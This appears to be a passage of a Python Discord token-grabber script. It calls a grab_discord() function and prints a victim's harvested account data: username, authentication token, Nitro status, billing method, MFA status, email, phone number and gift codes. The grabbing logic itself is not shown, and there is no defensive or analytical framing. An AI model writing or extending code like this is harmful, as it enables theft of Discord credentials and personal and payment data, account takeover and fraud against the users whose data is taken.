...
chabchoub = grab_discord()
azee = chabchoub.initialize()
data = json.loads(azee[0])
print(data)
print(f"Name : {data['username']}")
print(f"Token : {data['token']}")
print(f"nitro : {data['nitro']}")
print(f"billing metod : {data['billing']}")
print(f"A2F : {data['mfa']}")
print(f"E-Mail adress : {data['email']}")
print(f"Phone number : {data['phone']}")
print(f"gift_codes : {data['gift_codes']}")
